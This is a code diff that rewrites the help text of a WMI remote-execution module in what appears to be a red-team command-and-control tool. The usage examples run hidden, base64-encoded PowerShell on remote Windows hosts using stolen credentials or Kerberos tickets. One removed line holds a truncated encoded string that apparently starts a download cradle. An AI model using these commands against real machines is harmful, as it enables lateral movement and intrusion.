@@ -67,14 +67,19 @@ std::string WmiExec::getInfo()
 {
 	std::string info;
 #ifdef BUILD_TEAMSERVER
-	info += "WmiExec:\n";
-	info += "Execute a command through Windows Management Instrumentation (WMI). \n";
-    info += "The user have to be administrator of the remote machine. \n";
-    info += "Can be use with credentials or with kerberos authentication. \n";
-    info += "To use with kerberos, the ticket must be in memory (use Rubeus). \n";
-	info += "exemple:\n";
-	info += "- wmiExec -u DOMAIN\\Username Password target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV\n";
-    info += "- wmiExec -k DOMAIN\\dc target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV\n";
+    info += "WmiExec Module:\n";
+    info += "Execute a remote command using Windows Management Instrumentation (WMI).\n";
+    info += "Administrator privileges on the remote machine are required.\n";
+    info += "Supports both credential-based and Kerberos authentication.\n";
+    info += "For Kerberos authentication, ensure a valid ticket is already loaded in memory (e.g., via Rubeus).\n";
+    info += "\nUsage examples:\n";
+    info += " - wmiExec -u DOMAIN\\Username Password DOMAIN\\dc powershell.exe -nop -w hidden -e <Base64Payload>\n";
+    info += " - wmiExec -k DOMAIN\\dc target powershell.exe -nop -w hidden -e <Base64Payload>\n";
+    info += "\nOptions:\n";
+    info += " -u <user> <password> <target>  Use username and password authentication\n";
+    info += " -k <target>                    Use Kerberos authentication (ticket must be in memory)\n";
+    info += "\nNote:\n";
+    info += " The command and arguments following the target are passed to the remote process.\n";
 #endif
 	return info;
 }
